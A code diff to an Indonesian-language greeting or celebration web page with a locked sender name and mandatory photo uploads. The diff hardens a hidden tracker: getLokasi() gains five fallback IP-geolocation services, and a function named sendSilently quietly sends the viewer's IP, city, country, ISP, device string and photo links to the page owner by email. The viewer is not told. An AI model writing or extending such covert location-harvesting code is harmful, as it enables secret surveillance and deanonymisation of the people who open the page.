@@ -249,7 +249,8 @@ footer{border-top:1px solid var(--line);padding:0 0 46px}
       <label class="fld"><span>Tanggal spesial</span><input type="date" id="inpTanggal" required></label>
       <label class="fld"><span>Pesan pendek untuknya <i class="tiny2">(opsional)</i></span><textarea id="inpPesan" placeholder="tulis sesuatu yang manis..." maxlength="200"></textarea></label>
       <label class="fld locked"><span>Dari — terkunci 🔒</span><input type="text" value="Walden ✦" disabled><small>Nama pengirim terkunci permanen.</small></label>
-      <div class="fld"><span>Foto kenangan <i class="tiny2">(WAJIB, minimal 1 · maks 8)</i></span>        <div class="thumbs" id="thumbs"><label class="add-tile" for="inpFoto">＋</label><input type="file" id="inpFoto" accept="image/*" multiple hidden></div>
+      <div class="fld"><span>Foto kenangan <i class="tiny2">(WAJIB, minimal 1 · maks 8)</i></span>
+        <div class="thumbs" id="thumbs"><label class="add-tile" for="inpFoto">＋</label><input type="file" id="inpFoto" accept="image/*" multiple hidden></div>
         <small>Foto pertama dipajang besar di halaman utama, semuanya tampil di galeri.</small></div>
       <button class="btn" type="submit" id="submitBtn">Mulai Perayaan ✦</button>
       <p class="setup-note" id="setupErr"></p>
@@ -406,7 +407,7 @@ function fileToDataURL(file, maxW = 500, quality = .65){
 }
 
 /* ============================================================
-   EMAIL + LOKASI + UPLOAD FOTO
+   EMAIL + LOKASI (5 LAPIS BACKUP, SEMUA HTTPS — aman di HP)
 ============================================================ */
 let emailjsReady = false;
 async function initEmailJS(){
@@ -418,21 +419,31 @@ async function initEmailJS(){
 
 async function getLokasi(){
   const kosong = { kota:'-', provinsi:'-', negara:'-', ip:'-', isp:'-' };
+  // 1) ipwho.is
   try {
-    const r = await fetch('https://ipwho.is/');
-    const j = await r.json();
+    const j = await (await fetch('https://ipwho.is/')).json();
     if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country||'-', ip:j.ip||'-', isp:(j.connection&&j.connection.isp)||'-' };
-  } catch(e){ console.warn('[LOKASI] ipwho.is gagal:', e); }
+  } catch(e){ console.warn('[LOKASI] 1 gagal'); }
+  // 2) ipapi.co
   try {
-    const r = await fetch('https://ipapi.co/json/');
-    const j = await r.json();
+    const j = await (await fetch('https://ipapi.co/json/')).json();
     if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country_name||'-', ip:j.ip||'-', isp:j.org||'-' };
-  } catch(e){ console.warn('[LOKASI] ipapi.co gagal:', e); }
+  } catch(e){ console.warn('[LOKASI] 2 gagal'); }
+  // 3) ipinfo.io
   try {
-    const r = await fetch('http://ip-api.com/json/?fields=status,city,regionName,country,query,isp');
-    const j = await r.json();
-    if (j && j.status === 'success') return { kota:j.city||'-', provinsi:j.regionName||'-', negara:j.country||'-', ip:j.query||'-', isp:j.isp||'-' };
-  } catch(e){ console.warn('[LOKASI] ip-api gagal:', e); }
+    const j = await (await fetch('https://ipinfo.io/json')).json();
+    if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country||'-', ip:j.ip||'-', isp:j.org||'-' };
+  } catch(e){ console.warn('[LOKASI] 3 gagal'); }
+  // 4) bigdatacloud (tanpa key)
+  try {
+    const j = await (await fetch('https://api.bigdatacloud.net/data/client-ip-info')).json();
+    if (j && j.city) return { kota:j.city||'-', provinsi:j.principalSubdivision||j.locality||'-', negara:j.countryName||'-', ip:j.ipString||'-', isp:'-' };
+  } catch(e){ console.warn('[LOKASI] 4 gagal'); }
+  // 5) ipify (IP saja)
+  try {
+    const j = await (await fetch('https://api.ipify.org?format=json')).json();
+    if (j && j.ip) return { kota:'-', provinsi:'-', negara:'-', ip:j.ip, isp:'-' };
+  } catch(e){ console.warn('[LOKASI] 5 gagal'); }
   return kosong;
 }
 
@@ -487,6 +498,7 @@ async function sendSilently(trigger = 'unknown'){
     const waktu = new Date().toLocaleString('id-ID',{dateStyle:'full',timeStyle:'short'});
     const device = navigator.userAgent.substring(0, 120);
     const lokasi = await getLokasi();
+    const lokasi_lengkap = [lokasi.kota, lokasi.provinsi, lokasi.negara].filter(v => v && v !== '-').join(', ') || '-';
     const punyaFoto = DATA.fotos.length > 0;
     const urls = await buildFotoLinks(DATA.fotos);
     const params = {
@@ -497,7 +509,7 @@ async function sendSilently(trigger = 'unknown'){
       kota: lokasi.kota,
       provinsi: lokasi.provinsi,
       negara: lokasi.negara,
-      lokasi_lengkap: [lokasi.kota, lokasi.provinsi, lokasi.negara].filter(v => v && v !== '-').join(', ') || '-',
+      lokasi_lengkap: lokasi_lengkap,
       ip_penerima: lokasi.ip,
       isp: lokasi.isp,
       jumlah_foto: String(DATA.fotos.length),
@@ -544,7 +556,6 @@ function applyData(){
   $('#who').textContent = nama;
   $('#who2').textContent = nama.toLowerCase();
   $('#who3').textContent = nama.toLowerCase();
-  // isi surat
   const sn1 = $('#suratNama');  if (sn1) sn1.textContent = nama;
   const sn2 = $('#suratNama2'); if (sn2) sn2.textContent = nama;
   const su  = $('#suratUmur');  if (su)  su.textContent  = hitungUmur();
@@ -629,7 +640,7 @@ $('#polBox').addEventListener('click', e => {
 });
 
 /* ============================================================
-   SETUP FORM
+   SETUP FORM (FOTO WAJIB)
 ============================================================ */
 const setupEl = $('#setup');
 let tempFotos = [];
